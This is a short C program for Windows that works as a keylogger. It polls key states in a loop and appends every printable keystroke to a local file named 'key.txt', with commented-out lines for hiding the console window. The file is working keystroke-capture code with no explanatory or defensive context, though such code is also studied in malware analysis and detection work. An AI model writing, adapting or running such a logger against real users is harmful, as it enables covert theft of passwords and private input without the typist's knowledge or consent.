#define _WIN32_WINNT 0x0500

#include<stdio.h>
#include<stdlib.h>
#include<windows.h>
#include <stdbool.h>

int main()
{
    HWND hwnd=GetConsoleWindow();
    //ShowWindow(hwnd,SW_MINIMIZE); //wont hide the window, minimise
    //ShowWindow(hwnd,SW_HIDE);

    FILE *fp;
    fp = fopen("key.txt","a");
    if(fp==NULL){
        puts("Sorry! Cant open file");
        exit(1);
    }
    char buffer[5] = {0};
    bool keyDown[94] = {false};
    while (1) {
        for(int i = 32; i < 127; i++){
            buffer[0] = (char)i;
            if ((GetAsyncKeyState(i) & 0x8000) && !keyDown[i-32]) {
                sprintf(buffer, "%c", (char)i);
                fputs(buffer, fp);
                fflush(fp);
                keyDown[i-32] = true;
                printf(buffer);
            }else if (!(GetAsyncKeyState(i) & 0x8000)) {
                keyDown[i-32] = false;
            }            
        }

        Sleep(50);
    }
    
    fclose(fp);
 
 return 0;
}
